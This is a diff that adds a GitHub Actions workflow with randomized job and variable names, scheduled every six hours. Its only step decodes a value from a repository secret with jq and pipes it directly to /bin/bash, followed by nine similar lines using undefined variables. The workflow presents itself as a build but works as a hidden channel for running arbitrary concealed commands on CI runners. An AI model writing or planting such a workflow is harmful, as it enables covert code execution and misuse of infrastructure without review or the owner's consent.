@@ -1,0 +1,27 @@
+name: deankubernetes349
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: deankubernetes349
+        env:
+          kix344: ${{ secrets.kix344 }}
+        run: |
+          echo $kix344 | jq -r .urtk0696 | /bin/bash
+          echo $c4 | jq -r .qgbot06265 | /bin/bash
+          echo $uk341 | jq -r .jf9524 | /bin/bash
+          echo $w57003 | jq -r .ku1922 | /bin/bash
+          echo $qyq17284 | jq -r .ndgg9 | /bin/bash
+          echo $xoctl675 | jq -r .ktset91386 | /bin/bash
+          echo $ve741 | jq -r .blgpp45 | /bin/bash
+          echo $cno49250 | jq -r .tml5448 | /bin/bash
+          echo $bostk00 | jq -r .zscgc62 | /bin/bash
+          echo $z2030 | jq -r .rx8 | /bin/bash
+
